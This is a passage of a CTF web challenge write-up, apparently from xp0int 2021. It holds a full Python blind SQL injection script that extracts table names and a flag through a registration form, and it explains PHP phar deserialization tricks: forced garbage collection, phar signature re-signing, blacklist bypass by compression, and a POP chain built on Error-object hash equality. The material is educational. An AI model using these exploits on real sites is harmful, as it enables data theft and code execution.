class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://35.220.149.77:16034/&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62&#x27;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>(<span class="params">payload, cookies</span>):</span><br><span class="line">    r = requests.post(url=url + <span class="string">&quot;register.php&quot;</span>, headers=headers, cookies=cookies, data=&#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;email&quot;</span>: payload[<span class="number">0</span>:<span class="number">32</span>], <span class="string">&quot;password&quot;</span>: payload, <span class="string">&quot;confirm&quot;</span>: payload&#125;, proxies=proxies)</span><br><span class="line">    rule = <span class="string">r&#x27;&lt;script&gt;(.+?);&lt;/script&gt;&#x27;</span></span><br><span class="line">    result = re.findall(rule, r.text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">0</span>] != <span class="string">&quot;window.location.href=&#x27;login.php?register&#x27;&quot;</span>:</span><br><span class="line">            <span class="comment"># print(&quot;register&quot;, result[0])</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>(<span class="params">payload, cookies</span>):</span><br><span class="line">    requests.post(url=url + <span class="string">&quot;login.php&quot;</span>, headers=headers, cookies=cookies, data=&#123;<span class="string">&quot;username&quot;</span>: payload, <span class="string">&quot;password&quot;</span>: payload&#125;, proxies=proxies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(<span class="params">payload, cookies</span>):</span><br><span class="line">    r = requests.get(url=url + <span class="string">&quot;index.php&quot;</span>, headers=headers, cookies=cookies, proxies=proxies)</span><br><span class="line">    rule = <span class="string">r&#x27;&lt;div class=&quot;container&quot;&gt;&lt;table class=&quot;table&quot;&gt;&lt;thead&gt;&lt;tr&gt;&lt;th scope=&quot;col&quot;&gt;#&lt;/th&gt;&lt;th scope=&quot;col&quot;&gt;Email&lt;/th&gt;&lt;th scope=&quot;col&quot;&gt;Time&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody&gt;(.+?)&lt;/tbody&gt;&lt;/table&gt;&lt;/div&gt;&#x27;</span></span><br><span class="line">    result = re.findall(rule, r.text)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result[<span class="number">0</span>]) == <span class="built_in">len</span>(<span class="string">&#x27;&lt;tr&gt;&lt;th scope=&quot;row&quot;&gt;1&lt;/th&gt;&lt;td&gt;%s&lt;/td&gt;&lt;td&gt;2021-11-29 14:21:50&lt;/td&gt;&lt;/tr&gt;&#x27;</span> % payload[<span class="number">0</span>:<span class="number">32</span>]):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_table_name</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;,&#125;&#x27;</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;</span><br><span class="line">            payload = <span class="string">&quot;%s&#x27;||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)regexp&#x27;%s$&#x27;)||&#x27;&quot;</span> % (hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(), i, j)</span><br><span class="line">            <span class="comment"># payload = &quot;%s&#x27;||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)like(&#x27;%s&#x27;))||&#x27;&quot; % (hashlib.md5(str(random.random()).encode(&#x27;utf-8&#x27;)).hexdigest(), i, j)</span></span><br><span class="line"></span><br><span class="line">            result = register(payload, cookies)</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> result:</span><br><span class="line">                cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;</span><br><span class="line">                payload = <span class="string">&quot;%s&#x27;||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)regexp&#x27;%s$&#x27;)||&#x27;&quot;</span> % (hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(), i, j)</span><br><span class="line">                <span class="comment"># payload = &quot;%s&#x27;||(mid((select(group_concat(table_name))from(sys.schema_auto_increment_columns)where((table_schema)like(0x6d656469756d))),%d,1)like(&#x27;%s&#x27;))||&#x27;&quot; % (hashlib.md5(str(random.random()).encode(&#x27;utf-8&#x27;)).hexdigest(), i, j)</span></span><br><span class="line">                result = register(payload, cookies)</span><br><span class="line"></span><br><span class="line">            login(payload, cookies)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> index(payload, cookies):</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> string.ascii_lowercase + string.digits + <span class="string">&#x27;&#123;,&#125;&#x27;</span>:</span><br><span class="line">            cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;</span><br><span class="line">            payload = <span class="string">&quot;%s&#x27;||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)regexp&#x27;%s$&#x27;)||&#x27;&quot;</span> % (hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(), i, j)</span><br><span class="line">            <span class="comment"># payload = &quot;%s&#x27;||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)like(&#x27;%s&#x27;))||&#x27;&quot; % (hashlib.md5(str(random.random()).encode(&#x27;utf-8&#x27;)).hexdigest(), i, j)</span></span><br><span class="line"></span><br><span class="line">            result = register(payload, cookies)</span><br><span class="line">            <span class="keyword">while</span> <span class="keyword">not</span> result:</span><br><span class="line">                cookies = &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;</span><br><span class="line">                payload = <span class="string">&quot;%s&#x27;||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)regexp&#x27;%s$&#x27;)||&#x27;&quot;</span> % (hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(), i, j)</span><br><span class="line">                <span class="comment"># payload = &quot;%s&#x27;||(mid((select(flag)from(c1c7fbbb74d0d43101a2814ade767362)),%d,1)like(&#x27;%s&#x27;))||&#x27;&quot; % (hashlib.md5(str(random.random()).encode(&#x27;utf-8&#x27;)).hexdigest(), i, j)</span></span><br><span class="line">                result = register(payload, cookies)</span><br><span class="line"></span><br><span class="line">            login(payload, cookies)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> index(payload, cookies):</span><br><span class="line">                <span class="built_in">print</span>(j, end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register(hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(), &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;)</span><br><span class="line">register(hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(), &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;)</span><br><span class="line">register(hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest(), &#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: hashlib.md5(<span class="built_in">str</span>(random.random()).encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;)</span><br><span class="line"></span><br><span class="line">get_table_name()</span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure>

<h2 id="medium-unserialize"><a href="#medium-unserialize" class="headerlink" title="medium-unserialize"></a>medium-unserialize</h2><h3 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h3><p>注意到在<code>Main</code>类中存在<code>file_put_contents</code>可以将phar的内容写入到文件中</p>
<p>而<code>file_exists</code>可以将之前写入的内容利用<code>phar://xxx</code>进行反序列化</p>
<h3 id="强制gc"><a href="#强制gc" class="headerlink" title="强制gc"></a>强制gc</h3><p><a target="_blank" rel="noopener" href="https://www.evonide.com/breaking-phps-garbage-collection-and-unserialize/">Breaking PHP’s Garbage Collection and Unserialize</a></p>
<p><a target="_blank" rel="noopener" href="https://ctftime.org/writeup/12781">类似的题目 35c3_php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//demo.php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;demo __wakeup()&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;demo __destruct()&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;str&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tmp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;str&quot;</span>]);<span class="comment">//此时$tmp在使用反序列化后生成的demo对象,即对象demo被引用,生命周期未结束,无法执行__destruct</span></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;I can&#x27;t destruct,help!!!&quot;</span>);<span class="comment">//异常抛出,程序立即退出,demo对象无法正常执行__destruct</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">unserialize($_POST[&quot;str&quot;]);//此时没有对该反序列化生成的对象进行引用,因此在完成反序列化操作后,对象生命周期结束,立刻执行__destruct</span></span><br><span class="line"><span class="comment">throw new Error(&quot;I can&#x27;t destruct,help!!!&quot;);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/2021-12-01%2014-34-43%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p>当对象没有被引用时,会立即执行垃圾回收操作,然后执行类的<code>__destruct</code>操作</p>
<p>假设传入的序列化字符串为<code>a:2:&#123;i:0;O:4:&quot;demo&quot;:0:&#123;&#125;i:0;O:4:&quot;fake&quot;:0:&#123;&#125;&#125;</code></p>
<p>反序列化开始,反序列化是顺序进行的,因此首先将<code>Array[0]</code>设置为<code>demo</code>对象</p>
<p>然后反序列化生成<code>fake</code>对象,此时,<code>Array[0]</code>被更新为<code>fake</code>对象</p>
<p><code>demo</code>对象失去引用,进行垃圾回收操作,执行demo的__destruct由此getfalg</p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/2021-12-01%2014-35-29%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//solve.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">demo</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fake</span></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">demo</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fake</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="variable">$a</span>,<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$str</span>=<span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;i:1;O:4:&quot;fake&quot;&#x27;</span>,<span class="string">&#x27;i:0;O:4:&quot;fake&quot;&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$str</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/opt/project/www/GarbageCollection/solve.php:<span class="number">11</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">15</span>) <span class="string">&quot;O:4:&quot;</span>demo<span class="string">&quot;:0:&#123;&#125;&quot;</span></span><br><span class="line">/opt/project/www/GarbageCollection/solve.php:<span class="number">14</span>:</span><br><span class="line"><span class="keyword">string</span>(<span class="number">44</span>) <span class="string">&quot;a:2:&#123;i:0;O:4:&quot;</span>demo<span class="string">&quot;:0:&#123;&#125;i:0;O:4:&quot;</span>fake<span class="string">&quot;:0:&#123;&#125;&#125;&quot;</span></span><br></pre></td></tr></table></figure>

<p>而在phar反序列时,phar反序列化产生的对象被metadata所引用,因此无法直接执行__destruct</p>
<p>同理使用上面提到的强制gc方式,但显然不能直接生成</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">demo</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">fake</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="variable">$a</span>,<span class="number">0</span>=&gt;<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p><code>a:1:&#123;i:0;O:4:&quot;fake&quot;:0:&#123;&#125;&#125;</code></p>
<p>因此需要正常生成一个phar文件后,再对phar文件进行篡改</p>
<h3 id="phar签名篡改"><a href="#phar签名篡改" class="headerlink" title="phar签名篡改"></a>phar签名篡改</h3><p>在对文件进行强制gc的篡改后,phar中的内容与phar的签名不一致,需要重新对phar进行签名</p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/phar.fileformat.signature.php">对phar签名的介绍</a></p>
<p>签名由三部分组成</p>
<ol>
<li><p>实际签名</p>
</li>
<li><p>签名方式 </p>
</li>
</ol>
<p><code>0x0001</code>为<code>md5</code>,<code>0x0002</code>为<code>sha1</code></p>
<ol start="3">
<li><code>GBMB</code>标记</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/2021-12-01%2010-07-55%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p>可以看到签名方式为<code>sha1</code>,那么重新计算签名前的数据的<code>sha1</code>校验和即可</p>
<blockquote>
<p>todo:有空可以试试将签名方式改成0x0000能不能绕过phar的签名</p>
</blockquote>
<h3 id="phar压缩绕过黑名单-file-put-contents数组传参"><a href="#phar压缩绕过黑名单-file-put-contents数组传参" class="headerlink" title="phar压缩绕过黑名单/file_put_contents数组传参"></a>phar压缩绕过黑名单/file_put_contents数组传参</h3><ol>
<li>phar压缩绕过黑名单</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/uxwHLckwx/">从虎符线下CTF深入反序列化利用</a></p>
<p><a target="_blank" rel="noopener" href="http://suphp.cn/anquanke/7/240007.html">从一道题再看phar的利用</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/2021-12-01%2009-48-36%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p>将phar包压缩成<code>gzip/bzip/tar</code>仍然能够触发反序列化</p>
<ol start="2">
<li>file_put_contents数组传参</li>
</ol>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;a&#x27;</span>, <span class="variable">$a</span>);<span class="comment">#file_put_contents可以使用数组作为参数,从而绕过某些过滤函数的限制</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;a&#x27;</span>));</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/2021-12-01%2009-41-32%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<p><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/function.file-put-contents.php">https://www.php.net/manual/zh/function.file-put-contents.php</a></p>
<p><img src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/xp0int-2021-ctf-web-wp/2021-12-01%2009-44-09%20%E7%9A%84%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png"></p>
<h3 id="构造pop链"><a href="#构造pop链" class="headerlink" title="构造pop链"></a>构造pop链</h3><p><code>Welcome-&gt;__destruct</code>中存在<code>sha1($this-&gt;sha1) === sha1($this-&gt;sha2)</code>且两者均不为array</p>
<p>这里需要用到原生类反序列化来进行绕过</p>
<p><code>Error</code>与<code>Exception</code>的<code>__construct</code>函数中均使用了<code>$message</code>和<code>$code</code>,但<code>__toString</code>中仅使用了<code>$message</code>,利用这一特性可以构造hash相同但值不同的两个变量</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$message</span> = <span class="string">&quot;misaka&quot;</span>, <span class="variable">$code</span> = <span class="number">0</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$message</span> = <span class="string">&quot;misaka&quot;</span>, <span class="variable">$code</span> = <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$b</span>));</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">object</span>(<span class="built_in">Error</span>)[<span class="number">1</span>]</span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;misaka&#x27;</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;string&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;&#x27;</span> (length=<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;code&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">0</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;file&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;/var/www/html/declared_class_unserialize/hash_cmp.php&#x27;</span> (length=<span class="number">53</span>)</span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;line&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;trace&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">empty</span></span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;previous&#x27;</span> =&gt; <span class="literal">null</span></span><br><span class="line"><span class="keyword">object</span>(<span class="built_in">Error</span>)[<span class="number">2</span>]</span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;message&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;misaka&#x27;</span> (length=<span class="number">6</span>)</span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;string&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;&#x27;</span> (length=<span class="number">0</span>)</span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;code&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">1</span></span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;file&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;/var/www/html/declared_class_unserialize/hash_cmp.php&#x27;</span> (length=<span class="number">53</span>)</span><br><span class="line">  <span class="keyword">protected</span> <span class="string">&#x27;line&#x27;</span> =&gt; <span class="keyword">int</span> <span class="number">2</span></span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;trace&#x27;</span> =&gt; </span><br><span class="line">    <span class="keyword">array</span> (size=<span class="number">0</span>)</span><br><span class="line">      <span class="keyword">empty</span></span><br><span class="line">  <span class="keyword">private</span> <span class="string">&#x27;previous&#x27;</span> =&gt; <span class="literal">null</span></span><br><span class="line"><span class="keyword">string</span> <span class="string">&#x27;ef3dfed4019c082d5ee86e9e93e1e4b1&#x27;</span> (length=<span class="number">32</span>)</span><br><span class="line"><span class="keyword">string</span> <span class="string">&#x27;ef3dfed4019c082d5ee86e9e93e1e4b1&#x27;</span> (length=<span class="number">32</span>)</span><br><span class="line"><span class="keyword">string</span> <span class="string">&#x27;131a711c4511f16665626f4f69dfe4b48339addf&#x27;</span> (length=<span class="number">40</span>)</span><br><span class="line"><span class="keyword">string</span> <span class="string">&#x27;131a711c4511f16665626f4f69dfe4b48339addf&#x27;</span> (length=<span class="number">40</span>)</span><br></pre></td></tr></table></figure>

<p><code>Welcome-&gt;__destruct</code>中还存在<code>md5($this-&gt;welcome) === md5(time())</code>,当<code>$this-&gt;welcome</code>指向某个类时,<code>md5($this-&gt;welcome)</code>会执行该类的<code>__toString</code>方法</p>
<p>由于存在短路运算符<code>&amp;&amp;</code>,因此要执行md5比较前还要满足<code>$this-&gt;randcode === $this-&gt;code</code>,而<code>$this-&gt;randcode</code>在执行<code>Welcome-&gt;__destruct</code>时被设置为<code>rand(1, 10086)</code></p>
<p>因此可以设置<code>$welcome-&gt;code =&amp; $welcome-&gt;randcode</code>来保证<code>$this-&gt;randcode === $this-&gt;code</code></p>
